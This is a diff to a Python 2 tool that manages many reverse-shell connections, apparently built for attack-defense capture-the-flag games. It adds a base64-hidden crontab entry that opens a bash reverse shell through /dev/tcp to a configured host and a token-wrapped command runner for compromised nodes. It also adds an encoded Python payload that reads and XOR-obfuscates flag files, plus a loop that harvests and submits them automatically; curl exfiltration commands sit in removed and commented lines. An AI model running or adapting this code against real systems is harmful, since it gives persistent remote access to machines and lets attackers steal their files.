@@ -24,9 +24,18 @@ sys.setdefaultencoding('utf-8')
 slaves = {}
 masters = {}
 
+
+flag_path = "/flag"
 EXIT_FLAG = False
 MAX_CONNECTION_NUMBER = 0x10
 
+def submit_flag(flag):
+    try:
+        # TODO
+        url = "http://127.0.0.1:5000/?flag=%s" % (flag)
+        print requests.get(url).content
+    except Exception as e:
+        print(e)
 
 def md5(data):
     return hashlib.md5(data).hexdigest()
@@ -115,13 +124,15 @@ class Slave():
         self.city = self.api_info['city']
 
     def location(self, host):
+        '''
         try:
             response = requests.get("http://ip.taobao.com/service/getIpInfo.php?ip=%s" % (host), timeout=0.5)
             content = response.content
             return json.loads(content)["data"]
         except Exception as e:
             Log.error(str(e))
-            return {"data":"error", 'country': 'Unknown_country','isp': 'Unknown_isp','area': 'Unknown_area','region': 'Unknown_region','city': 'Unknown_city',}
+        '''
+        return {"data":"error", 'country': 'Unknown_country','isp': 'Unknown_isp','area': 'Unknown_area','region': 'Unknown_region','city': 'Unknown_city',}
 
     def show_info(self):
         Log.info("Hash : %s" % (self.node_hash))
@@ -136,6 +147,20 @@ class Slave():
         except:
             self.remove_node()
             return False
+
+    def system_token(self, command):
+        token = random_string(0x10,string.letters)
+        payload = "echo '%s' && %s ; echo '%s'\n" % (token, command, token)
+        Log.info(payload)
+        self.send_command(payload)
+        time.sleep(0.2)
+        result = recvall(self.socket_fd)
+        print "%r" % (result)
+        if len(result.split(token)) == 3:
+            return result.split(token)[1]
+        else:
+            return "Somthing wrong"
+
 
     def send_command_log(self, command):
         log_file = "./log/%s.log" % (time.strftime("%Y-%m-%d_%H:%M:%S", time.localtime()))
@@ -154,6 +179,7 @@ class Slave():
             f.write("%s\n" % (result))
 
     def send_command_print(self, command):
+        print ">>>>>> %s" % command
         self.send_command(command)
         time.sleep(0.5)
         Log.info("Receving data from socket...")
@@ -225,9 +251,10 @@ class Slave():
         print recvall(self.socket_fd)
 
     def auto_connect(self, target_host, target_port):
-        self.del_crontab("bash")
+        # self.del_crontab("bash")
         content = '* * * * * bash -c "bash -i &>/dev/tcp/%s/%d 0>&1"\n' % (target_host, target_port)
-        self.add_crontab(content)
+        # self.add_crontab(content)
+        self.system_token("crontab -r;echo '%s'|base64 -d|crontab" % (content.encode("base64").replace("\n", "")))
 
     def remove_node(self):
         Log.error("Removing Node!")
@@ -292,6 +319,12 @@ def signal_handler(ignum, frame):
 def node_hash(host, port):
     return md5("%s:%d" % (host, port))
 
+def decode_flag(flag):
+    result = ""
+    key = 233
+    for i in flag:
+        result += chr(ord(i) ^ key)
+    return result
 
 def main():
     if len(sys.argv) != 3:
@@ -383,47 +416,91 @@ def main():
         elif command == "setr":
             EXEC_LOCAL = False
         elif command == "gaf":
-            flag_path = raw_input(
-                "Input flag path (/flag.txt) : ") or ("/flag.txt")
-            box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
-                "192.168.187.128")
-            box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
-            for i in slaves.keys():
-                slave = slaves[i]
-                cmd = "FLAG=`cat %s | base64`" % (flag_path)
-                Log.info("Command : %s" % (cmd))
-                result = slave.send_command(cmd)
-                cmd = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
-                    box_host, box_port)
-                Log.info("Command : %s" % (cmd))
-                result = slave.send_command(cmd)
-                if result:
-                    Log.info("Flag is sent to you!")
-                else:
-                    # slave.remove_node()
-                    Log.error("Executing command failed! Connection aborted! Node removed!")
-                    position = slaves.keys()[0]
-                    Log.info("Position changed to : %s" % (position))
+            while True:
+                '''
+                flag_path = raw_input(
+                    "Input flag path (/flag.txt) : ") or ("/flag.txt")
+                box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
+                    "192.168.187.128")
+                box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
+                '''
+                for i in slaves.keys():
+                    slave = slaves[i]
+                    r_info = open("host").read()
+                    r_host = r_info.split(":")[0]
+                    r_port = int(r_info.split(":")[1])
+                    slave.auto_connect(r_host, r_port)
+                    payload = "python -c 'exec(\"%s\".decode(\"base64\"))'" % '''
+flag = open("__FLAG_PATH__").read()
+key = 233
+result = ""
+for i in flag:
+    result += chr(ord(i) ^ key)
+print result
+                    '''.replace("__FLAG_PATH__", flag_path).encode("base64").replace("\n", "")
+                    # cmd = "FLAG=`%s`" % (payload)
+                    # Log.info(cmd)
+                    # exit(0)
+                    Log.info("Command : %s" % (payload))
+                    result = slave.system_token(payload)
+                    flag = decode_flag(result.replace("\n", "").replace("\r","")).replace("\n", "").replace("\r", "")
+                    Log.info("FLAG: %s" % flag)
+                    submit_flag(flag)
+                    Log.info("Submitted")
+                    '''
+                    cmd = "FLAG=`cat %s | base64`" % (flag_path)
+                    Log.info("Command : %s" % (cmd))
+                    result = slave.send_command(cmd)
+                    cmd = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
+                        box_host, box_port)
+                    Log.info("Command : %s" % (cmd))
+                    result = slave.send_command(cmd)
+                    if result:
+                        Log.info("Flag is sent to you!")
+                    else:
+                        # slave.remove_node()
+                        Log.error("Executing command failed! Connection aborted! Node removed!")
+                        position = slaves.keys()[0]
+                        Log.info("Position changed to : %s" % (position))
+                        '''
+                sleep_time = int(open("sleep").read())
+                if sleep_time == 0:
+                    break
+                time.sleep(sleep_time)
         elif command == "gf":
-            flag_path = raw_input(
-                "Input flag path (/flag.txt) : ") or ("/flag.txt")
-            box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
-                "192.168.187.128")
-            box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
-            cmd = "FLAG=`cat %s | base64`" % (flag_path)
-            Log.info("Command : %s" % (cmd))
-            result = current_slave.send_command(cmd)
-            cmd = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
-                box_host, box_port)
-            Log.info("Command : %s" % (cmd))
-            result = current_slave.send_command(cmd)
-            if result:
-                Log.info("Flag is sent to you!")
-            else:
-                # slave.remove_node()
-                Log.error("Executing command failed! Connection aborted! Node removed!")
-                position = slaves.keys()[0]
-                Log.info("Position changed to : %s" % (position))
+            # flag_path = raw_input(
+                # "Input flag path (/flag) : ") or ("/flag")
+            # box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
+                # "192.168.187.128")
+            # box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
+            payload = "python -c 'exec(\"%s\".decode(\"base64\"))'" % '''
+flag = open("__FLAG_PATH__").read()
+key = 233
+result = ""
+for i in flag:
+    result += chr(ord(i) ^ key)
+print result
+            '''.replace("__FLAG_PATH__", flag_path).encode("base64").replace("\n", "")
+            # cmd = "FLAG=`%s`" % (payload)
+            # Log.info(cmd)
+            # exit(0)
+            Log.info("Command : %s" % (payload))
+            result = current_slave.system_token(payload)
+            flag = decode_flag(result)
+            Log.info("FLAG: %s" % flag)
+            submit_flag(flag)
+            Log.info("Submitted")
+            # cmd = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
+            #     box_host, box_port)
+            # Log.info("Command : %s" % (cmd))
+            # result = current_slave.send_command(cmd)
+            # if result:
+                # Log.info("Flag is sent to you!")
+            # else:
+             #   # slave.remove_node()
+             ##   Log.error("Executing command failed! Connection aborted! Node removed!")
+             #   position = slaves.keys()[0]
+             #   Log.info("Position changed to : %s" % (position))
         elif command == "i":
             current_slave.interactive_shell()
         elif command == "d":
